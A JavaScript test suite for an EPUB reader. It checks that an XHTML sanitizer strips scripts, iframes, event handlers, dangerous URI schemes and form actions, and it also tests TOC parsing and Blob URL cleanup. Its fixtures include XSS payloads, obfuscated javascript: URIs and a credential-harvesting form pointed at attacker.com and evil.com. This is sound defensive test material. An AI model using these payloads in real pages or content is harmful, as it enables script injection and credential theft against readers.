/**
 * test/challenger_m2_r2_adversarial.js
 *
 * Milestone 2 Remediation 2 (M2 R2) Adversarial Challenger Stress Suite:
 * 1. Hostile XHTML Security Sanitization:
 *    - Stripping <iframe> (including lowercase, uppercase, nested, srcdoc, javascript: src)
 *    - Stripping <frame> and <frameset>
 *    - Stripping <object>, <embed>, <applet>, <base>, <meta http-equiv="refresh">
 *    - Stripping <script> tags (regular, CDATA, module, nested in SVG/MathML)
 *    - Stripping inline on* event handlers (onerror, onload, onclick, onmouseover, ONFOCUS, etc.)
 *    - Neutralizing dangerous URI schemes (javascript:, vbscript:, data:text/html, data:application/xhtml+xml)
 *      across <a>, <img>, <video>, <audio>, SVG <use>, <image>, and <svg><a xlink:href>
 * 2. Form Neutralization (forms cannot submit):
 *    - Stripping action, method, and target attributes from <form>
 *    - Stripping formaction, formmethod, and formtarget from <button> and <input>
 *    - Stripping onsubmit handler from <form>
 *    - Verifying form submission cannot dispatch network requests or execute script
 * 3. TOC Parser Resilience:
 *    - Unescaped ampersands (&) in EPUB 2 NCX XML (titles, labels, query attributes)
 *    - Mixed entities (&amp;, &#160;, &#xa0;, unescaped &, trailing/leading &)
 *    - Deep nesting in EPUB 2 NCX (10 levels deep)
 *    - Deep nesting in EPUB 3 Navigation Document (10 levels deep)
 *    - Tree flattening, depth calculation, leaf item discovery
 *    - Recursion guard verification (>20 levels deep capped gracefully without crashing)
 * 4. Blob URL Lifecycle & Memory Leak Audit:
 *    - Pre-extracting / extracting 60+ distinct assets (images, fonts, stylesheets, SVGs)
 *    - Tracking exactly 60+ generated Blob URLs in assetMap and blobUrls
 *    - Complete revocation on AssetExtractor.cleanup() via URL.revokeObjectURL
 *    - Asserting 100% revocation count, clear assetMap, clear blobUrls, isCleanedUp flag
 *    - Verification of post-cleanup safety (subsequent extractions return null without leaking)
 */

const fs = require('node:fs');
const path = require('node:path');
const puppeteer = require('puppeteer-core');
const { startServer } = require('./server.js');

const CHROME_PATH = process.env.CHROME_BIN || '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';

async function runAdversarialM2R2Suite() {
  console.log('====================================================================');
  console.log('   Milestone 2 Remediation 2 (M2 R2) Adversarial Challenger Suite   ');
  console.log('====================================================================');

  const { url: serverUrl, close: closeServer } = await startServer({ port: 0, autoPortFallback: true });
  console.log(`[m2_r2_challenger] Test server listening at ${serverUrl}`);
  console.log(`[m2_r2_challenger] Launching Chrome at: ${CHROME_PATH}`);

  const browser = await puppeteer.launch({
    executablePath: CHROME_PATH,
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
  });

  const page = await browser.newPage();

  page.on('console', msg => {
    if (msg.type() === 'error') {
      console.log(`[browser-error] ${msg.text()}`);
    }
  });

  try {
    await page.goto(`${serverUrl}/index.html`, { waitUntil: 'domcontentloaded' });

    const results = await page.evaluate(async () => {
      const suiteResults = [];

      function assert(condition, message) {
        if (!condition) {
          throw new Error(message);
        }
      }

      // Import modules under test
      const { PathResolver } = await import('/js/parser/path-resolver.js');
      const { TocParser, splitHrefAnchor, sanitizeXmlEntities } = await import('/js/parser/toc-parser.js');
      const { AssetExtractor, DOMSanitizer, resolveMimeType } = await import('/js/parser/asset-extractor.js');
      const { EpubParser } = await import('/js/parser/epub-parser.js');
      const JSZip = window.JSZip;

      // ====================================================================
      // 1. ADVERSARIAL SECURITY SANITIZATION (Hostile XHTML Elements & URIs)
      // ====================================================================
      try {
        const hostileXhtml = `<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <title>Hostile Security Test</title>
  <meta http-equiv="refresh" content="0;url=https://evil.com/phish" />
  <meta HTTP-EQUIV="Refresh" Content="2;URL=https://evil.com/refresh2" />
  <base href="https://attacker.com/malicious/" />
  <script>window.XSS_HEAD = true;</script>
  <script type="text/javascript">/*<![CDATA[*/window.XSS_CDATA = true;/*]]>*/</script>
</head>
<body onload="window.XSS_BODY_LOAD = true;" onunload="window.XSS_BODY_UNLOAD = true;">
  <!-- Standard & obfuscated scripts -->
  <script src="https://attacker.com/exploit.js"></script>
  <script type="module">import 'https://attacker.com/module.js';</script>

  <!-- Iframes in various forms -->
  <iframe src="https://attacker.com/cookie-stealer"></iframe>
  <IFRAME SRC="http://evil.com/capitalized"></IFRAME>
  <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
  <iframe src="javascript:alert('iframe-js')"></iframe>
  <div class="nested-wrapper">
    <span>
      <iframe src="https://attacker.com/nested"></iframe>
    </span>
  </div>

  <!-- Frames and Frameset -->
  <frameset rows="50%,50%">
    <frame src="https://attacker.com/frame1.html" />
    <frame src="https://attacker.com/frame2.html" />
  </frameset>

  <!-- Dangerous embedding objects -->
  <object data="https://attacker.com/exploit.swf" type="application/x-shockwave-flash">
    <param name="allowScriptAccess" value="always" />
  </object>
  <embed src="https://attacker.com/exploit.swf" type="application/x-shockwave-flash" />
  <applet code="Malicious.class" archive="malware.jar"></applet>

  <!-- Inline event handlers across elements -->
  <img src="nonexistent-1.jpg" onerror="window.XSS_IMG_ERROR = true;" onload="window.XSS_IMG_LOAD = true;" />
  <button ONCLICK="window.XSS_BTN_CLICK = true;" onfocus="window.XSS_FOCUS = true;" OnBlur="window.XSS_BLUR = true;">Test</button>
  <div onmouseover="window.XSS_MOUSE = true;" onmouseenter="window.XSS_ENTER = true;" onkeydown="window.XSS_KEY = true;">Hover</div>

  <!-- SVG scripts and event handlers -->
  <svg width="100" height="100" onload="window.XSS_SVG_LOAD = true;">
    <script>window.XSS_SVG_SCRIPT = true;</script>
    <circle cx="50" cy="50" r="40" onclick="window.XSS_CIRCLE = true;" />
    <a xlink:href="javascript:window.XSS_SVG_LINK = true;">
      <text x="10" y="20">SVG JS Link</text>
    </a>
  </svg>

  <!-- MathML script injection -->
  <math>
    <script>window.XSS_MATH_SCRIPT = true;</script>
    <mtext onclick="window.XSS_MATH_CLICK = true;">Formula</mtext>
  </math>

  <!-- Dangerous URI schemes in <a> links -->
  <a id="link-js-lower" href="javascript:alert(1)">JS Lower</a>
  <a id="link-js-upper" href="JAVASCRIPT:alert(2)">JS Upper</a>
  <a id="link-js-mixed" href="JavaScriPt:alert(3)">JS Mixed</a>
  <a id="link-js-padded" href="   javascript:alert(4)">JS Padded</a>
  <a id="link-js-ctrl" href="java\u0000script:alert(5)">JS Null Byte</a>
  <a id="link-js-tab" href="java\u0009script:alert(6)">JS Tab</a>
  <a id="link-vb" href="vbscript:msgbox(1)">VBScript</a>
  <a id="link-data-html" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data HTML</a>
  <a id="link-data-xhtml" href="data:application/xhtml+xml,&lt;html&gt;&lt;/html&gt;">Data XHTML</a>

  <!-- Dangerous URIs in media attributes -->
  <video poster="javascript:alert('poster-xss')">
    <source src="javascript:alert('source-xss')" type="video/mp4" />
  </video>
  <audio src="javascript:alert('audio-xss')"></audio>

  <!-- Valid, safe markup that MUST be preserved -->
  <p id="safe-p" class="content-paragraph">This is safe chapter text that must remain intact.</p>
  <a id="safe-external" href="https://example.com/learn-more" target="_blank">Safe External Link</a>
  <a id="safe-anchor" href="#section-2">Jump to Section 2</a>
  <img id="safe-img" src="images/safe-diagram.png" alt="Safe Diagram" />
</body>
</html>`;

        const zip = new JSZip();
        zip.file('OEBPS/text/hostile-chapter.xhtml', hostileXhtml);
        zip.file('OEBPS/text/images/safe-diagram.png', new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10])); // PNG magic

        const extractor = new AssetExtractor(zip);
        const preparedDoc = await extractor.getChapterDocument('OEBPS/text/hostile-chapter.xhtml');

        // Check 1: ALL <script> tags removed (in head, body, svg, mathml)
        const scripts = preparedDoc.querySelectorAll('script');
        assert(scripts.length === 0, `Expected 0 script tags, found ${scripts.length}`);

        // Check 2: ALL <iframe> tags stripped (lower, upper, nested, srcdoc)
        const iframes = preparedDoc.querySelectorAll('iframe, IFRAME');
        assert(iframes.length === 0, `Expected 0 iframe tags, found ${iframes.length}`);

        // Check 3: ALL <frame> and <frameset> tags stripped
        const frames = preparedDoc.querySelectorAll('frame, frameset');
        assert(frames.length === 0, `Expected 0 frame/frameset tags, found ${frames.length}`);

        // Check 4: ALL <object>, <embed>, <applet>, <base> tags stripped
        const dangerousEmbeds = preparedDoc.querySelectorAll('object, embed, applet, base');
        assert(dangerousEmbeds.length === 0, `Expected 0 object/embed/applet/base tags, found ${dangerousEmbeds.length}`);

        // Check 5: ALL <meta http-equiv="refresh"> tags stripped
        const metaRefresh = preparedDoc.querySelectorAll('meta[http-equiv="refresh" i]');
        assert(metaRefresh.length === 0, `Expected 0 meta refresh tags, found ${metaRefresh.length}`);

        // Check 6: 100% inline on* event handlers removed on ALL elements
        const elementsWithOn = Array.from(preparedDoc.querySelectorAll('*')).filter(el => {
          return Array.from(el.attributes).some(attr => attr.name.toLowerCase().startsWith('on'));
        });
        assert(elementsWithOn.length === 0, `Expected 0 inline on* handlers, found ${elementsWithOn.length}`);

        // Check 7: Dangerous URI schemes completely stripped from attributes
        const dangerousIds = [
          'link-js-lower', 'link-js-upper', 'link-js-mixed', 'link-js-padded',
          'link-js-ctrl', 'link-js-tab', 'link-vb', 'link-data-html', 'link-data-xhtml'
        ];
        for (const id of dangerousIds) {
          const el = preparedDoc.getElementById(id);
          assert(el !== null, `Element #${id} should exist`);
          const href = el.getAttribute('href') || '';
          assert(!href.toLowerCase().startsWith('javascript:'), `#${id} still has javascript: URI: ${href}`);
          assert(!href.toLowerCase().startsWith('vbscript:'), `#${id} still has vbscript: URI: ${href}`);
          assert(!href.toLowerCase().startsWith('data:text/html'), `#${id} still has data:text/html URI: ${href}`);
          assert(!href.toLowerCase().startsWith('data:application/xhtml'), `#${id} still has data:application/xhtml URI: ${href}`);
        }

        // Check media attributes
        const video = preparedDoc.querySelector('video');
        assert(!video.hasAttribute('poster') || !video.getAttribute('poster').toLowerCase().startsWith('javascript:'), 'video poster not sanitized');
        const source = preparedDoc.querySelector('source');
        assert(!source.hasAttribute('src') || !source.getAttribute('src').toLowerCase().startsWith('javascript:'), 'source src not sanitized');
        const audio = preparedDoc.querySelector('audio');
        assert(!audio.hasAttribute('src') || !audio.getAttribute('src').toLowerCase().startsWith('javascript:'), 'audio src not sanitized');

        // Check 8: Safe content preserved
        const safeP = preparedDoc.getElementById('safe-p');
        assert(safeP !== null && safeP.textContent.includes('safe chapter text'), 'Safe paragraph corrupted or removed');
        const safeExternal = preparedDoc.getElementById('safe-external');
        assert(safeExternal !== null && safeExternal.getAttribute('href') === 'https://example.com/learn-more', 'Safe external link corrupted');
        const safeImg = preparedDoc.getElementById('safe-img');
        assert(safeImg !== null && safeImg.getAttribute('src').startsWith('blob:'), 'Safe image was not rewritten to blob URL');

        extractor.cleanup();

        suiteResults.push({
          suite: 'Security Sanitization',
          name: 'Hostile XHTML Sanitization (iframe, frame, frameset, object, embed, script, onerror, javascript: URIs)',
          passed: true
        });
      } catch (err) {
        suiteResults.push({
          suite: 'Security Sanitization',
          name: 'Hostile XHTML Sanitization (iframe, frame, frameset, object, embed, script, onerror, javascript: URIs)',
          passed: false,
          error: err.message
        });
      }

      // ====================================================================
      // 2. ADVERSARIAL FORM NEUTRALIZATION (Forms Cannot Submit)
      // ====================================================================
      try {
        const formHtml = `<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Form Neutralization Test</title></head>
<body>
  <!-- Standard phishing form -->
  <form id="form-phish" action="https://attacker.com/harvest-credentials" method="POST" target="_blank" onsubmit="window.FORM_SUBMITTED = true; return true;">
    <label for="username">Username:</label>
    <input type="text" id="username" name="user" value="victim" />
    <label for="password">Password:</label>
    <input type="password" id="password" name="pass" />
    <button type="submit" id="btn-submit">Sign In</button>
  </form>

  <!-- Form with button formaction overrides -->
  <form id="form-override" action="https://attacker.com/default-submit" method="GET">
    <input type="text" name="query" value="search" />
    <button type="submit" id="btn-override" formaction="https://attacker.com/override-submit" formmethod="POST" formtarget="_top">Override Button</button>
    <input type="submit" id="input-override" formaction="https://attacker.com/input-submit" formmethod="POST" formtarget="_parent" value="Override Input" />
    <input type="image" id="image-override" formaction="https://attacker.com/image-submit" formmethod="POST" src="images/btn.png" alt="Submit Image" />
  </form>

  <!-- Form with javascript: action URI -->
  <form id="form-js-action" action="javascript:window.JS_FORM_STEAL = true;">
    <button type="submit" id="btn-js-action">Submit via JS</button>
  </form>
</body>
</html>`;

        const zip = new JSZip();
        zip.file('OEBPS/text/form-chapter.xhtml', formHtml);
        zip.file('OEBPS/text/images/btn.png', new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]));

        const extractor = new AssetExtractor(zip);
        const preparedDoc = await extractor.getChapterDocument('OEBPS/text/form-chapter.xhtml');

        // Form elements MUST remain present in the DOM for document layout/styling
        const forms = preparedDoc.querySelectorAll('form');
        assert(forms.length === 3, `Expected 3 form elements, found ${forms.length}`);

        // Check Form 1: action, method, target, onsubmit stripped
        const formPhish = preparedDoc.getElementById('form-phish');
        assert(formPhish !== null, 'form-phish not found');
        assert(!formPhish.hasAttribute('action'), 'form-phish action was not stripped');
        assert(!formPhish.hasAttribute('method'), 'form-phish method was not stripped');
        assert(!formPhish.hasAttribute('target'), 'form-phish target was not stripped');
        assert(!formPhish.hasAttribute('onsubmit'), 'form-phish onsubmit was not stripped');

        // Check Form 2: button and input formaction overrides stripped
        const formOverride = preparedDoc.getElementById('form-override');
        assert(!formOverride.hasAttribute('action'), 'form-override action was not stripped');
        assert(!formOverride.hasAttribute('method'), 'form-override method was not stripped');

        const btnOverride = preparedDoc.getElementById('btn-override');
        assert(!btnOverride.hasAttribute('formaction'), 'btn-override formaction was not stripped');
        assert(!btnOverride.hasAttribute('formmethod'), 'btn-override formmethod was not stripped');
        assert(!btnOverride.hasAttribute('formtarget'), 'btn-override formtarget was not stripped');

        const inputOverride = preparedDoc.getElementById('input-override');
        assert(!inputOverride.hasAttribute('formaction'), 'input-override formaction was not stripped');
        assert(!inputOverride.hasAttribute('formmethod'), 'input-override formmethod was not stripped');
        assert(!inputOverride.hasAttribute('formtarget'), 'input-override formtarget was not stripped');

        const imageOverride = preparedDoc.getElementById('image-override');
        assert(!imageOverride.hasAttribute('formaction'), 'image-override formaction was not stripped');
        assert(!imageOverride.hasAttribute('formmethod'), 'image-override formmethod was not stripped');

        // Check Form 3: javascript: action stripped
        const formJs = preparedDoc.getElementById('form-js-action');
        assert(!formJs.hasAttribute('action'), 'form-js-action action was not stripped');

        // Verify that forms cannot submit or dispatch actions
        // When appended to a test iframe or document, submit has no destination
        for (const f of forms) {
          assert(!f.hasAttribute('action'), 'Form must not have action');
          assert(!f.hasAttribute('method'), 'Form must not have method');
          assert(!f.hasAttribute('target'), 'Form must not have target');
        }

        extractor.cleanup();

        suiteResults.push({
          suite: 'Form Neutralization',
          name: 'Form neutralization (action, method, target, formaction, and submit controls stripped)',
          passed: true
        });
      } catch (err) {
        suiteResults.push({
          suite: 'Form Neutralization',
          name: 'Form neutralization (action, method, target, formaction, and submit controls stripped)',
          passed: false,
          error: err.message
        });
      }

      // ====================================================================
      // 3. ADVERSARIAL TOC PARSER (Unescaped Ampersands & Deep Nesting)
      // ====================================================================
      try {
        // 3.1 Hostile EPUB 2 NCX with diverse unescaped ampersands & mixed entities
        const hostileNcx = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ncx PUBLIC "-//NISO//DTD ncx 2005-1//EN" "http://www.daisy.org/z3986/2005/ncx-2005-1.dtd">
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">
  <head>
    <meta name="dtb:uid" content="urn:uuid:hostile-ncx-001"/>
    <meta name="dtb:depth" content="10"/>
  </head>
  <docTitle>
    <text>Optics & Waves &amp; Modern Physics</text>
  </docTitle>
  <navMap>
    <navPoint id="np-1" playOrder="1">
      <navLabel>
        <text>Romeo & Juliet & Friar Laurence</text>
      </navLabel>
      <content src="text/ch01.xhtml?mode=read&amp;theme=sepia&zoom=100"/>
    </navPoint>
    <navPoint id="np-2" playOrder="2">
      <navLabel>
        <text>Tom & Jerry && Butch &</text>
      </navLabel>
      <content src="text/ch02.xhtml"/>
      <!-- Deep nesting under np-2: Level 2 down to Level 10 -->
      <navPoint id="np-2-1" playOrder="3">
        <navLabel><text>R&D & Innovation (Level 2)</text></navLabel>
        <content src="text/ch02.xhtml#l2"/>
        <navPoint id="np-2-1-1" playOrder="4">
          <navLabel><text>Science & Tech (Level 3)</text></navLabel>
          <content src="text/ch02.xhtml#l3"/>
          <navPoint id="np-2-1-1-1" playOrder="5">
            <navLabel><text>Hardware & Software (Level 4)</text></navLabel>
            <content src="text/ch02.xhtml#l4"/>
            <navPoint id="np-2-1-1-1-1" playOrder="6">
              <navLabel><text>Chips & Transistors (Level 5)</text></navLabel>
              <content src="text/ch02.xhtml#l5"/>
              <navPoint id="np-2-1-1-1-1-1" playOrder="7">
                <navLabel><text>Gates & Logic (Level 6)</text></navLabel>
                <content src="text/ch02.xhtml#l6"/>
                <navPoint id="np-2-1-1-1-1-1-1" playOrder="8">
                  <navLabel><text>Photons & Electrons (Level 7)</text></navLabel>
                  <content src="text/ch02.xhtml#l7"/>
                  <navPoint id="np-2-1-1-1-1-1-1-1" playOrder="9">
                    <navLabel><text>Quarks & Leptons (Level 8)</text></navLabel>
                    <content src="text/ch02.xhtml#l8"/>
                    <navPoint id="np-2-1-1-1-1-1-1-1-1" playOrder="10">
                      <navLabel><text>Strings & Branes (Level 9)</text></navLabel>
                      <content src="text/ch02.xhtml#l9"/>
                      <navPoint id="np-2-1-1-1-1-1-1-1-1-1" playOrder="11">
                        <navLabel><text>Quantum Foam (Level 10)</text></navLabel>
                        <content src="text/ch02.xhtml#quantum-foam"/>
                      </navPoint>
                    </navPoint>
                  </navPoint>
                </navPoint>
              </navPoint>
            </navPoint>
          </navPoint>
        </navPoint>
      </navPoint>
    </navPoint>
    <navPoint id="np-3" playOrder="12">
      <navLabel>
        <text>AT&T &amp; Bell Labs &#160; Research &#xa0; Archive &amp; Notes</text>
      </navLabel>
      <content src="text/ch03.xhtml"/>
    </navPoint>
  </navMap>
</ncx>`;

        const toc = TocParser.parseNcxDocument(hostileNcx, 'OEBPS/toc.ncx');

        assert(toc.length === 3, `Expected 3 top-level NCX items, got ${toc.length}`);

        // Verify entity decodings
        assert(toc[0].title === 'Romeo & Juliet & Friar Laurence', `Title 1 mismatch: "${toc[0].title}"`);
        assert(toc[0].fullPath === 'OEBPS/text/ch01.xhtml', `FullPath 1 mismatch: "${toc[0].fullPath}"`);

        assert(toc[1].title === 'Tom & Jerry && Butch &', `Title 2 mismatch: "${toc[1].title}"`);

        // Verify deep nesting (10 levels)
        let current = toc[1];
        let depthCount = 1;
        while (current.children && current.children.length > 0) {
          current = current.children[0];
          depthCount++;
        }
        assert(depthCount === 10, `Expected 10 levels of nesting, counted ${depthCount}`);
        assert(current.title === 'Quantum Foam (Level 10)', `Deepest leaf title mismatch: "${current.title}"`);
        assert(current.hash === 'quantum-foam', `Deepest leaf hash mismatch: "${current.hash}"`);
        assert(current.fullPath === 'OEBPS/text/ch02.xhtml', `Deepest leaf fullPath mismatch: "${current.fullPath}"`);

        // Test TocParser.flatten
        const flatList = TocParser.flatten(toc);
        assert(flatList.length === 12, `Expected 12 flattened items, got ${flatList.length}`);
        const deepestFlat = flatList.find(item => item.title.includes('Level 10'));
        assert(deepestFlat !== undefined, 'Deepest item not found in flat list');
        assert(deepestFlat.depth === 9, `Expected depth 9 for Level 10, got ${deepestFlat.depth}`);

        // Test TocParser.findItem
        const found = TocParser.findItem(toc, 'OEBPS/text/ch02.xhtml', 'quantum-foam');
        assert(found !== null, 'Failed to find deep item by path and hash');
        assert(found.title === 'Quantum Foam (Level 10)', `Found title mismatch: "${found.title}"`);

        // Verify item 3 with mixed entities
        assert(toc[2].title.includes('AT&T & Bell Labs'), `Title 3 missing AT&T & Bell Labs: "${toc[2].title}"`);

        // 3.2 Deeply nested EPUB 3 Navigation Document (10 levels)
        let deepNavHtml = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<body>
  <nav epub:type="toc" id="toc" role="doc-toc">
    <h1>Table of Contents</h1>
    <ol>
      <li><a href="text/ch1.xhtml">EPUB3 Level 1</a>`;

        for (let i = 2; i <= 10; i++) {
          deepNavHtml += `<ol><li><a href="text/ch1.xhtml#l${i}">EPUB3 Level ${i}</a>`;
        }
        for (let i = 2; i <= 10; i++) {
          deepNavHtml += `</li></ol>`;
        }
        deepNavHtml += `</li></ol></nav></body></html>`;

        const epub3Toc = TocParser.parseNavDocument(deepNavHtml, 'OEBPS/nav.xhtml');
        assert(epub3Toc.length === 1, `Expected 1 top-level item in EPUB3 toc, got ${epub3Toc.length}`);

        let currEpub3 = epub3Toc[0];
        let epub3Depth = 1;
        while (currEpub3.children && currEpub3.children.length > 0) {
          currEpub3 = currEpub3.children[0];
          epub3Depth++;
        }
        assert(epub3Depth === 10, `Expected 10 levels in EPUB3 Nav, got ${epub3Depth}`);
        assert(currEpub3.title === 'EPUB3 Level 10', `Deepest EPUB3 title mismatch: "${currEpub3.title}"`);
        assert(currEpub3.hash === 'l10', `Deepest EPUB3 hash mismatch: "${currEpub3.hash}"`);

        // 3.3 Recursion depth protection (>20 levels deep capped gracefully without crashing)
        let extremeNcx = `<?xml version="1.0" encoding="UTF-8"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/">
  <navMap>
    <navPoint id="p1"><navLabel><text>L1</text></navLabel><content src="ch.xhtml"/>`;
        for (let i = 2; i <= 30; i++) {
          extremeNcx += `<navPoint id="p${i}"><navLabel><text>L${i}</text></navLabel><content src="ch.xhtml#l${i}"/>`;
        }
        for (let i = 2; i <= 30; i++) {
          extremeNcx += `</navPoint>`;
        }
        extremeNcx += `</navPoint></navMap></ncx>`;

        const cappedToc = TocParser.parseNcxDocument(extremeNcx, 'OEBPS/toc.ncx');
        assert(cappedToc.length === 1, 'Capped TOC failed to parse');
        const cappedFlat = TocParser.flatten(cappedToc);
        // Recursion guard is MAX_RECURSION_DEPTH = 20, so maximum depth is 20 items
        assert(cappedFlat.length <= 20, `Recursion guard exceeded: got ${cappedFlat.length} items`);

        suiteResults.push({
          suite: 'Adversarial TOC Parser',
          name: 'TOC parser with unescaped ampersands (&), mixed entities, and deep nesting (10 levels + recursion guard)',
          passed: true
        });
      } catch (err) {
        suiteResults.push({
          suite: 'Adversarial TOC Parser',
          name: 'TOC parser with unescaped ampersands (&), mixed entities, and deep nesting (10 levels + recursion guard)',
          passed: false,
          error: err.message
        });
      }

      // ====================================================================
      // 4. BLOB URL REVOCATION ACROSS 50+ ASSETS ON cleanup()
      // ====================================================================
      try {
        const zip = new JSZip();
        const totalAssets = 65; // 65 distinct assets (well over 50)
        const assetPaths = [];

        // Generate 25 images, 15 fonts, 15 stylesheets, 10 icons
        for (let i = 1; i <= 25; i++) {
          const p = `OEBPS/images/photo_${i}.jpg`;
          zip.file(p, new Uint8Array([0xFF, 0xD8, 0xFF, 0xE0, i]));
          assetPaths.push(p);
        }
        for (let i = 1; i <= 15; i++) {
          const p = `OEBPS/fonts/font_${i}.woff2`;
          zip.file(p, new Uint8Array([0x77, 0x4F, 0x46, 0x32, i]));
          assetPaths.push(p);
        }
        for (let i = 1; i <= 15; i++) {
          const p = `OEBPS/css/theme_${i}.css`;
          zip.file(p, `body.theme-${i} { color: #${i}${i}${i}; }`);
          assetPaths.push(p);
        }
        for (let i = 1; i <= 10; i++) {
          const p = `OEBPS/icons/icon_${i}.svg`;
          zip.file(p, `<svg xmlns="http://www.w3.org/2000/svg"><circle r="${i}"/></svg>`);
          assetPaths.push(p);
        }

        assert(assetPaths.length === totalAssets, `Asset paths count mismatch: ${assetPaths.length}`);

        const extractor = new AssetExtractor(zip);

        // Extract all 65 assets to create 65 Blob URLs
        const generatedBlobUrls = new Set();
        for (const p of assetPaths) {
          const url = await extractor.extractAsset(p);
          assert(url !== null, `Failed to extract asset: ${p}`);
          assert(url.startsWith('blob:'), `Asset URL is not a blob URL: ${url}`);
          generatedBlobUrls.add(url);
        }

        assert(extractor.assetMap.size === totalAssets, `Expected assetMap size ${totalAssets}, got ${extractor.assetMap.size}`);
        assert(extractor.blobUrls.size === totalAssets, `Expected blobUrls size ${totalAssets}, got ${extractor.blobUrls.size}`);
        assert(generatedBlobUrls.size === totalAssets, `Expected 65 unique Blob URLs, got ${generatedBlobUrls.size}`);

        // Spy on URL.revokeObjectURL
        const revokedUrls = [];
        const originalRevoke = URL.revokeObjectURL;
        URL.revokeObjectURL = function (blobUrl) {
          revokedUrls.push(blobUrl);
          return originalRevoke.call(URL, blobUrl);
        };

        try {
          // Perform cleanup
          extractor.cleanup();

          // Assertions
          assert(revokedUrls.length === totalAssets, `Expected ${totalAssets} revoke calls, got ${revokedUrls.length}`);

          // Verify every single generated Blob URL was revoked
          for (const url of generatedBlobUrls) {
            assert(revokedUrls.includes(url), `Blob URL was not revoked: ${url}`);
          }

          assert(extractor.assetMap.size === 0, `assetMap not cleared: size = ${extractor.assetMap.size}`);
          assert(extractor.blobUrls.size === 0, `blobUrls not cleared: size = ${extractor.blobUrls.size}`);
          assert(extractor.manifestByPath.size === 0, `manifestByPath not cleared`);
          assert(extractor.isCleanedUp === true, 'isCleanedUp flag not set');

          // Subsequent extraction attempts must return null and allocate NO new blobs
          const postRevokeCount = revokedUrls.length;
          const retryUrl = await extractor.extractAsset(assetPaths[0]);
          assert(retryUrl === null, 'extractAsset after cleanup must return null');
          assert(extractor.assetMap.size === 0, 'assetMap allocated after cleanup');
          assert(revokedUrls.length === postRevokeCount, 'Unexpected revoke call during post-cleanup extraction');

          // Idempotent cleanup call
          extractor.cleanup();
          assert(revokedUrls.length === postRevokeCount, 'cleanup() should be idempotent and not re-revoke');

        } finally {
          URL.revokeObjectURL = originalRevoke;
        }

        suiteResults.push({
          suite: 'Memory Leak Audit',
          name: 'Blob URL revocation across 65 assets on cleanup() (100% revocation & idempotency)',
          passed: true
        });
      } catch (err) {
        suiteResults.push({
          suite: 'Memory Leak Audit',
          name: 'Blob URL revocation across 65 assets on cleanup() (100% revocation & idempotency)',
          passed: false,
          error: err.message
        });
      }

      return suiteResults;
    });

    console.log('\n--- M2 R2 Adversarial Challenge Results ---');
    let allPassed = true;
    for (const r of results) {
      if (r.passed) {
        console.log(`  ✅ PASS: [${r.suite}] ${r.name}`);
      } else {
        allPassed = false;
        console.log(`  ❌ FAIL: [${r.suite}] ${r.name}`);
        console.log(`     Error: ${r.error}`);
      }
    }
    console.log('-------------------------------------------');

    if (!allPassed) {
      console.error('\nCHALLENGE FAILED: Bugs found during empirical stress testing.\n');
      process.exitCode = 1;
    } else {
      console.log('\nCHALLENGE PASSED: All adversarial scenarios verified.\n');
      process.exitCode = 0;
    }

  } catch (err) {
    console.error('Fatal execution error:', err);
    process.exitCode = 1;
  } finally {
    await browser.close();
    await closeServer();
  }
}

runAdversarialM2R2Suite();
